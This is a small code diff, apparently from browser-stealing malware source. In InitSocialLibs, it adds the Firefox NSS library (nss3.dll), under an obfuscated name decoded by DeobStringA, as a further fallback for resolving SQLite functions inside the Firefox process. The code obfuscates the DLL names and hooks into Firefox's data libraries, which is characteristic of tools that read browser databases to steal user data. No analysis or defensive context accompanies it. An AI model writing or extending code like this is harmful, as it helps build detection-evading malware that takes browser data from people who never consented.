@@ -25,13 +25,15 @@ extern void FireFoxInitFunc();
 
 #define SQLITEALT_LIBRARY_NAME  "05O9ByZLIn.Xyy" //"mozsqlite3.dll"
 #define SQLITE_LIBRARY_NAME  "9ByZLIn.Xyy" //"sqlite3.dll"
+#define NSS_LIBRARY_NAME   "199n.Xyy" //"nss3.dll"
 
 int static InitSocialLibs()
 {
 	FireFoxInitFunc();
 	if (!(libsqlsc = GetModuleHandleA(DeobStringA(SQLITE_LIBRARY_NAME)))) 
 		if (!(libsqlsc = GetModuleHandleA(DeobStringA(SQLITEALT_LIBRARY_NAME))))
-			return 0;
+			if (!(libsqlsc = GetModuleHandleA(DeobStringA(NSS_LIBRARY_NAME))))
+				return 0;
 	
 	// sqlite functions
 	social_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlsc, "sqlite3_open");
